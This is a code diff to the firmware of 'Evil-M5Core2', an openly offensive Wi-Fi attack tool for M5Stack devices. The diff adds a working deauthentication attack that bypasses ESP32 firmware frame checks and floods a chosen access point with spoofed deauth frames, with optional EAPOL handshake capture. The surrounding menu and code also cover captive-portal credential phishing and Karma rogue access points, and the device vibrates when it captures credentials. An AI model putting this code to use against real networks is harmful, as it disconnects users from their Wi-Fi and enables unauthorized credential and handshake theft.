@@ -30,6 +30,10 @@
 */
 // remember to change hardcoded webpassword below in the code to ensure no unauthorized access to web interface : !!!!!! CHANGE THIS !!!!!
 // Also remember that bluetooth is not protected and anyone can connect to it without pincode ( esp librairies issue) to ensure protection serial password is implemented
+// Warning
+// You need to bypass the esp32 firmware with scripts in utilities before compiling or deauth is not working due to restrictions on ESP32 firmware
+// Warning
+
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
@@ -43,6 +47,13 @@
 #include <ArduinoJson.h>
 #include "BLEDevice.h"
 #include <vector>
+#include <esp_task_wdt.h>
+
+//deauth
+#include "esp_wifi_types.h"
+#include "esp_event_loop.h"
+//deauth end
+
 
 #include "BluetoothSerial.h"
 BluetoothSerial ESP_BT;
@@ -72,7 +83,7 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Credentials", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Bluetooth ON/OFF", "Wardriving", "Beacon Spam", "Handshake/Deauth Sniffing", "Wall Of Flipper"};
+const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Credentials", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Bluetooth ON/OFF", "Wardriving", "Beacon Spam", "Deauther", "Handshake/Deauth Sniffing", "Wall Of Flipper"};
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 
 const int maxMenuDisplay = 10;
@@ -199,10 +210,10 @@ bool isItSerialCommand = false;
 
 // deauth and pwnagotchi detector part
 
-const long channelHopInterval = 5000;
+const long channelHopInterval = 5000; // hoppping time interval
 unsigned long lastChannelHopTime = 0;
 int currentChannelDeauth = 1;
-bool autoChannelHop = true; // Commence en mode auto
+bool autoChannelHop = false; // Commence en mode auto
 int lastDisplayedChannelDeauth = -1;
 bool lastDisplayedMode = !autoChannelHop; // Initialisez à l'opposé pour forcer la première mise à jour
 unsigned long lastScreenClearTime = 0; // Pour suivre le dernier effacement de l'écran
@@ -216,6 +227,8 @@ int nombreDeEAPOL = 0;
 File pcapFile;
 // deauth and pwnagotchi detector end
 
+//vib
+bool vibration;
 
 void setup() {
   M5.begin();
@@ -228,6 +241,7 @@ void setup() {
       GPS_RX_PIN = 13;
       GPS_TX_PIN = 14;
       Serial.println("M5Core2 Board detected.");
+      vibration = true; // Change this to false for no vibration
       break;
     case m5::board_t::board_M5Stack: // Présumé ici comme étant le modèle Fire
       // Configuration pour Fire
@@ -318,7 +332,7 @@ void setup() {
     "Where we're going We don't\nneed roads   Nefast - 1985",// Donation on Ko-fi // Thx Nefast !
     "Never leave a trace always\n behind you by CyberOzint",// Donation on Ko-fi // Thx CyberOzint !
     "   Injecting hook.worm \nransomware to your android",// Donation on Ko-fi // Thx hook.worm !
-    "   Summoning the void             \nby kdv88", // Donation on Ko-fi // Thx kdv88 !
+    "   Summoning the void  \n          by kdv88", // Donation on Ko-fi // Thx kdv88 !
     "  Egg sandwich - robt2d2",// Donation on Ko-fi // Thx hook.worm ! Thx robt2d2 !
     "    You know Kiyomi ?   ", // for collab on Wof
     "           42           ",
@@ -387,7 +401,7 @@ void setup() {
     "Butters Awkward Escapades",
     "Navigating the Multiverse",
     "    Affirmative Dave,\n        I read you.",
-    "  Your Evil-M5Core3 have\n     died of dysentery",
+    "  Your Evil-M5Core2 have\n     died of dysentery",
   };
 
   const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
@@ -406,7 +420,12 @@ void setup() {
     Serial.println("----------------------");
     restoreConfigParameter("brightness");
     drawImage("/img/startup.jpg");
-    if (ledOn) {
+    if (vibration) {
+      M5.Power.Axp192.setLDO3(3300);
+      delay(200);
+      M5.Power.Axp192.setLDO3(0);
+      delay(1500);
+    } else if (ledOn) {
       pixels.setPixelColor(4, pixels.Color(255, 0, 0));
       pixels.setPixelColor(5, pixels.Color(255, 0, 0));
       pixels.show();
@@ -465,7 +484,7 @@ void setup() {
   M5.Display.setCursor(75, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
   M5.Display.setCursor(102, textY + 45);
-  M5.Display.println("v1.2.0 2024");
+  M5.Display.println("v1.2.1 2024");
   Serial.println("By 7h30th3r0n3");
   Serial.println("-------------------");
   M5.Display.setCursor(0 , textY + 120);
@@ -679,9 +698,12 @@ void executeMenuItem(int index) {
       beaconAttack();
       break;
     case 21:
-      deauthDetect();
+      deauthAttack(currentListIndex);
       break;
     case 22:
+      deauthDetect();
+      break;
+    case 23:
       wallOfFlipper();
       break;
   }
@@ -726,7 +748,7 @@ void drawMenu() {
       M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
       M5.Display.setTextColor(TFT_GREEN);
     } else {
-      M5.Display.setTextColor(TFT_WHITE);
+      M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
     }
     M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
     M5.Display.println(menuItems[menuIndex]);
@@ -1753,7 +1775,7 @@ void handleFileDelete() {
   }
   if (SD.exists(fileName)) {
     if (SD.remove(fileName)) {
-      server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
+      server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 300);</script></body></html>");
       Serial.println("-------------------");
       Serial.println("File deleted successfully");
       Serial.println("-------------------");
@@ -1800,6 +1822,11 @@ void saveCredentials(const String& email, const String& password, const String& 
     Serial.println("On Portal Name: " + portalName);
     Serial.println("With Cloned SSID: " + clonedSSID);
     Serial.println("-------------------");
+    if (vibration) {
+      M5.Power.Axp192.setLDO3(3300);
+      delay(300);
+      M5.Power.Axp192.setLDO3(0);
+    }
   } else {
     Serial.println("Error opening file for writing");
   }
@@ -2719,8 +2746,9 @@ void drawStartButtonKarma() {
 void drawStopButtonKarma() {
   M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
   M5.Display.setCursor(100, M5.Display.height() - 40);
-  M5.Display.println("Stop Sniff");
   M5.Display.setTextColor(TFT_WHITE);
+  M5.Display.println("Stop Sniff");
+
 }
 
 void startScanKarma() {
@@ -2735,8 +2763,8 @@ void startScanKarma() {
   esp_wifi_set_promiscuous_rx_cb(NULL);
   esp_wifi_deinit();
   delay(300); //petite pause
-  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-  esp_wifi_init(&cfg);
+  wifi_init_config_t cfg1 = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg1);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);
@@ -2945,6 +2973,11 @@ void startAPWithSSIDKarma(const char* ssid) {
     Serial.println("-------------------");
     Serial.println("Karma Attack worked !");
     Serial.println("-------------------");
+    if (vibration) {
+      M5.Power.Axp192.setLDO3(3300);
+      delay(500);
+      M5.Power.Axp192.setLDO3(0);
+    }
   } else {
     M5.Display.println(" Karma Failed...");
     Serial.println("-------------------");
@@ -3461,8 +3494,8 @@ void restoreOriginalWiFiSettings() {
   esp_wifi_set_promiscuous_rx_cb(NULL);
   esp_wifi_deinit();
   delay(300); // Petite pause pour s'assurer que tout est terminé
-  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-  esp_wifi_init(&cfg);
+  wifi_init_config_t cfg1 = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg1);
   esp_wifi_start();
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
   restoreOriginalMAC();
@@ -3484,8 +3517,8 @@ void startAutoKarma() {
   esp_wifi_set_promiscuous_rx_cb(NULL);
   esp_wifi_deinit();
   delay(300); // Petite pause pour s'assurer que tout est terminé
-  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-  esp_wifi_init(&cfg);
+  wifi_init_config_t cfg1 = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg1);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
@@ -3757,6 +3790,11 @@ void activateAPForAutoKarma(const char* ssid) {
       inMenu = true;
       Serial.println("-------------------");
       Serial.println("Karma Successful for : " + String(clonedSSID));
+      if (vibration) {
+        M5.Power.Axp192.setLDO3(3300);
+        delay(500);
+        M5.Power.Axp192.setLDO3(0);
+      }
       Serial.println("-------------------");
       memset(lastSSID, 0, sizeof(lastSSID));
       newSSIDAvailable = false;
@@ -3776,8 +3814,8 @@ void activateAPForAutoKarma(const char* ssid) {
   esp_wifi_set_promiscuous_rx_cb(NULL);
   esp_wifi_deinit();
   delay(300); // Petite pause pour s'assurer que tout est terminé
-  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-  esp_wifi_init(&cfg);
+  wifi_init_config_t cfg1 = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg1);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
@@ -3869,9 +3907,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.2.0"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.2.1"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Core2";
-  preHeader += ",release=v1.2.0"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.2.1"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-M5Core2"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Stack Core2";
@@ -4341,20 +4379,20 @@ unsigned long lastTime = 0;  // Last time update
 unsigned int packetCount = 0;  // Number of packets received
 
 void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
-  packetCount++; 
+  packetCount++;
   unsigned long currentTime = millis();
-  if (currentTime - lastTime >= 1000) { 
+  if (currentTime - lastTime >= 1000) {
     if (packetCount < 100) {
-      M5.Lcd.setCursor(224, 0); 
+      M5.Lcd.setCursor(224, 0);
     } else {
       M5.Lcd.setCursor(212, 0);
     }
     M5.Lcd.printf(" PPS:%d ", packetCount);
 
-    lastTime = currentTime; 
-    packetCount = 0; 
+    lastTime = currentTime;
+    packetCount = 0;
   }
-  
+
   if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
 
   wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
@@ -4524,16 +4562,15 @@ void deauthDetect() {
   M5.Lcd.setTextColor(WHITE, BLACK);
   ESP_BT.end();
   bluetoothEnabled = false;
-  esp_wifi_set_promiscuous(false);
-  esp_wifi_stop();
-  esp_wifi_set_promiscuous_rx_cb(NULL);
-  esp_wifi_deinit();
-  delay(300); //petite pause
-  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-  esp_wifi_init(&cfg);
+  /*esp_wifi_set_promiscuous(false);
+    esp_wifi_stop();
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    esp_wifi_deinit();*/
+  delay(500); //petite pause
+  wifi_init_config_t cfg2 = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg2);
   esp_wifi_start();
   WiFi.mode(WIFI_STA);
-  esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(snifferCallback);
   esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
@@ -4563,6 +4600,8 @@ void deauthDetect() {
   }
 
   while (!btnBPressed) {
+    esp_task_wdt_reset();  // Réinitialisation du watchdog
+    vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
     M5.update(); // Mettre à jour l'état des boutons
     // Gestion du bouton B pour basculer entre le mode auto et statique
     if (M5.BtnB.wasPressed()) {
@@ -4620,6 +4659,14 @@ void deauthDetect() {
     delay(10);
   }
   esp_wifi_set_promiscuous(false);
+  esp_wifi_stop();
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_deinit();
+  wifi_init_config_t cfg0 = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg0);
+  esp_wifi_start();
+  delay(100); // Petite pause pour s'assurer que tout est terminé
+
   autoChannelHop = !autoChannelHop;
   waitAndReturnToMenu("Stop detection...");
 }
@@ -4929,3 +4976,247 @@ void wallOfFlipper() {
   waitAndReturnToMenu("Stop detection...");
 }
 // Wof part end
+
+
+
+
+// deauther start
+// Big thanks to Aro2142 (https://github.com/7h30th3r0n3/Evil-M5Core2/issues/16)
+// Even Bigger thanks to spacehuhn https://github.com/spacehuhn / https://spacehuhn.com/
+// Big thanks to the Nemo project for the easy bypass: https://github.com/n0xa/m5stick-nemo
+// Reference to understand : https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser
+
+// Warning
+// You need to bypass the esp32 firmware with scripts in utilities before compiling or deauth is not working due to restrictions on ESP32 firmware
+// Warning
+
+void snifferCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
+  const uint8_t *frame = pkt->payload;
+  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
+
+  const uint8_t frameType = (frameControl & 0x0C) >> 2;
+  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;
+
+  if (estUnPaquetEAPOL(pkt)) {
+    Serial.println("EAPOL Detected !!!!");
+
+    const uint8_t *receiverAddr = frame + 4;
+    const uint8_t *senderAddr = frame + 10;
+
+    Serial.print("Address MAC destination: ");
+    printAddress(receiverAddr);
+    Serial.print("Address MAC expedition: ");
+    printAddress(senderAddr);
+
+    enregistrerDansFichierPCAP(pkt, false);
+    nombreDeEAPOL++;
+    M5.Lcd.setCursor(260, 0);
+    M5.Lcd.printf("H:");
+    M5.Lcd.print(nombreDeHandshakes);
+    if (nombreDeEAPOL < 999) {
+      M5.Lcd.setCursor(212, 18);
+    } else {
+      M5.Lcd.setCursor(202, 18);
+    }
+    M5.Lcd.printf("EAPOL:");
+    M5.Lcd.print(nombreDeEAPOL);
+  }
+
+  if (frameType == 0x00 && frameSubType == 0x08) {
+    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon
+
+    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
+    char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);
+
+
+    pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
+    enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
+  }
+
+}
+
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+  if (arg == 31337)
+    return 1;
+  else
+    return 0;
+}
+
+// MAC source
+uint8_t source_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};
+//MAC client
+uint8_t receiver_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //brodcast // should not work on some device that need to be mac spoofed
+//MAC access point
+uint8_t ap_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};
+
+static const uint8_t deauth_frame_default[] = {
+  0xc0, 0x00, 0x3a, 0x01,
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xf0, 0xff, 0x02, 0x00
+};
+
+void updateMacAddresses(uint8_t* bssid) {
+  memcpy(source_mac, bssid, 6);
+  memcpy(ap_mac, bssid, 6);
+}
+
+int deauthCount = 0;
+void deauthAttack(int networkIndex) {
+
+
+
+  String ssid = WiFi.SSID(networkIndex);
+  if (!confirmPopup("Deauth attack on:\n      " + ssid)) {
+    inMenu = true;
+    drawMenu();
+    return;
+  }
+  Serial.println("Deauth attack started");
+
+  ESP_BT.end();
+  bluetoothEnabled = false;
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_stop();
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_deinit();
+  delay(300); // Petite pause pour s'assurer que tout est terminé
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_mode(WIFI_MODE_STA); // Set station mode
+  esp_wifi_start(); // start Wi-Fi
+
+
+  if (confirmPopup("   Do you want to\n       sniff EAPOL ?")) {
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(snifferCallbackDeauth);
+  }
+
+  if (networkIndex < 0 || networkIndex >= numSsid) {
+    Serial.println("Network index out of bounds");
+    return;
+  }
+  M5.Display.clear();
+
+  // Récupérer les informations de l'AP sélectionné
+  uint8_t* bssid = WiFi.BSSID(networkIndex);
+  int channel = WiFi.channel(networkIndex);
+  String macAddress = bssidToString(bssid);
+
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  currentChannelDeauth = channel;
+  updateMacAddresses(bssid);
+
+  Serial.print("SSID: "); Serial.println(ssid);
+  Serial.print("MAC Address: "); Serial.println(macAddress);
+  Serial.print("Channel: "); Serial.println(channel);
+
+  if (!bssid || channel <= 0) {
+    Serial.println("Invalid AP - aborting attack");
+    M5.Display.println("Invalid AP");
+    return;
+  }
+
+  int delayTime = 500; // initial delay between deauth packets
+  unsigned long previousMillis = 0;
+  const int debounceDelay = 200;
+  unsigned long lastDebounceTime = 0;
+
+  // Setup display
+  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
+  M5.Display.setCursor(135, M5.Display.height() - 40);
+  M5.Display.setTextColor(TFT_WHITE);
+  M5.Display.println("Stop");
+
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5.Display.setCursor(10, 40);
+  M5.Display.println("SSID: " + ssid);
+  M5.Display.setCursor(10, 60);
+  M5.Display.println("MAC: " + macAddress);
+  M5.Display.setCursor(10, 80);
+  M5.Display.println("Channel : " + String(channel));
+
+  M5.Display.setCursor(10, 110);
+  M5.Display.print("Deauth sent: ");
+  Serial.println("-------------------");
+  Serial.println("Starting Deauth Attack");
+  Serial.println("-------------------");
+
+  while (true) {
+    unsigned long currentMillis = millis();
+
+    if (currentMillis - previousMillis >= delayTime) {
+      previousMillis = currentMillis;
+
+      sendDeauthPacket();
+      deauthCount++;
+
+      M5.Display.setCursor(M5.Display.height() / 2 + 35, 110);
+      M5.Display.print(String(deauthCount));
+
+      M5.Display.setCursor(100, M5.Display.height() / 2 + 20);
+      M5.Display.print("Delay: " + String(delayTime) + "ms    ");
+
+      Serial.println("-------------------");
+      Serial.println("Deauth packet sent : " + String(deauthCount));
+      Serial.println("-------------------");
+    }
+
+    M5.update();
+    // Adjust delay with buttons
+    if (M5.BtnA.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
+      lastDebounceTime = currentMillis;
+      delayTime = max(0, delayTime - 100); // Decrease delay
+    }
+    if (M5.BtnC.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
+      lastDebounceTime = currentMillis;
+      delayTime = min(1000, delayTime + 100); // Increase delay
+    }
+    if (M5.BtnB.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
+      break; // Stop the attack
+    }
+  }
+  Serial.println("-------------------");
+  Serial.println("Stopping Deauth Attack");
+  Serial.println("-------------------");
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  /*esp_wifi_stop();
+    esp_wifi_deinit();*/
+
+  waitAndReturnToMenu("Stopping Deauth Attack");
+}
+
+void sendDeauthPacket() {
+  // Création d'une copie modifiable du paquet de déauthentification
+  uint8_t deauth_frame[sizeof(deauth_frame_default)];
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+
+  // Modifier les adresses MAC dans le paquet de déauthentification copié
+  for (int i = 0; i < 6; i++) {
+    deauth_frame[4 + i] = receiver_mac[i];  // Adresse MAC du récepteur
+    deauth_frame[10 + i] = source_mac[i];  // Adresse MAC source
+    deauth_frame[16 + i] = ap_mac[i];      // Adresse MAC de l'access point
+  }
+
+  // Envoyer le paquet modifié
+  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+
+  /*// Affichage du contenu du paquet pour le débogage
+    Serial.println("Deauthentication Frame:");
+    for (int i = 0; i < sizeof(deauth_frame); i++) {
+    Serial.print(deauth_frame[i], HEX);
+    Serial.print(" ");
+    }
+    Serial.println();*/
+}
+
+//deauther end
